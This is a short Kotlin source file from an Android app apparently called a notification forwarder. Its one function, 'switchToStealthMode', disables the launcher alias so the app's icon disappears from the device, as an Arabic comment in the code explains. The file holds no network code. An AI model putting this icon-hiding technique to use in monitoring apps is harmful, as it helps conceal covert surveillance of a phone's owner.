package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun switchToStealthMode(context: Context) {
        val packageManager = context.packageManager

        // تعطيل الـ LauncherAlias المسؤول عن إظهار الأيقونة
        val aliasComponent = ComponentName(
            context.packageName,
            "com.itsazni.notificationforwarder.LauncherAlias"
        )

        try {
            packageManager.setComponentEnabledSetting(
                aliasComponent,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
